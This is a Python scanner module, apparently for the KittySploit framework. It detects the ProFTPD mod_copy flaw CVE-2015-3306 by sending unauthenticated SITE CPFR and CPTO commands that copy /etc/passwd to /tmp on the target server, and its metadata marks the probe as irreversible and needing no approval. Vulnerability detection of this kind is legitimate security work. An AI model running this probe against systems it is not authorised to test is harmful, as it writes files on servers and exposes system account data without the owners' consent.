#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ProFTPD mod_copy unauthenticated SITE CPFR/CPTO (CVE-2015-3306)."""

import socket

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        'name': 'ProFTPD - mod_copy CPFR/CPTO Detection (CVE-2015-3306)',
        'description': (
            'Detects CVE-2015-3306 by issuing unauthenticated SITE CPFR /etc/passwd '
            'then SITE CPTO /tmp/passwd.copy and matching copy success.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'scanner', 'tcp', 'ftp', 'proftpd', 'cve', 'cve2015', 'rce', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_write', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2015-3306',
        ],
        'cve': 'CVE-2015-3306',
    }

    port = OptPort(21, 'FTP port', True)

    def run(self):
        host = self._host()
        port = self._port()
        if not host or not self.is_tcp_open(host, port):
            return False
        try:
            sock = socket.create_connection((host, port), timeout=self._timeout())
            sock.settimeout(self._timeout())
            sock.recv(256)
            sock.sendall(b'site cpfr /etc/passwd\n')
            recv1 = sock.recv(256).decode('latin-1', errors='replace')
            if '350 File or directory exists' not in recv1:
                sock.close()
                return False
            sock.sendall(b'site cpto /tmp/passwd.copy\n')
            recv2 = sock.recv(256).decode('latin-1', errors='replace')
            sock.close()
        except Exception:
            return False
        if '250 Copy successful' in recv2:
            self.set_info(
                severity='critical',
                reason='ProFTPD mod_copy unauth copy (CVE-2015-3306)',
                path=f'tcp/{port}',
            )
            return True
        return False
